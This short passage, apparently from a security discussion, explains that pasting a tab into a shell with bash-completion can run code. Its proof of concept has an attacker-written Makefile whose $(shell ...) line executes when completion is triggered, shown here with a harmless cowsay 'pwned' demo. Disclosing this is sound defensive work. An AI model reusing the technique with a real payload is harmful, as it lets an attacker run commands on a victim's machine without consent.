Similarly, tab is an "active" character in most shells.

In the worst case (the victim uses bash with bash-completion installed, 
and the attacker has write access to the victim's filesystem), pasting 
tab can be as bad as pasting LF.

Here's a proof of concept:

   $ printf 'x := $(shell (echo; cowsay pwned)>/dev/tty)' > moo
   $ make -f moo <tab>
    _______
   < pwned >
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||
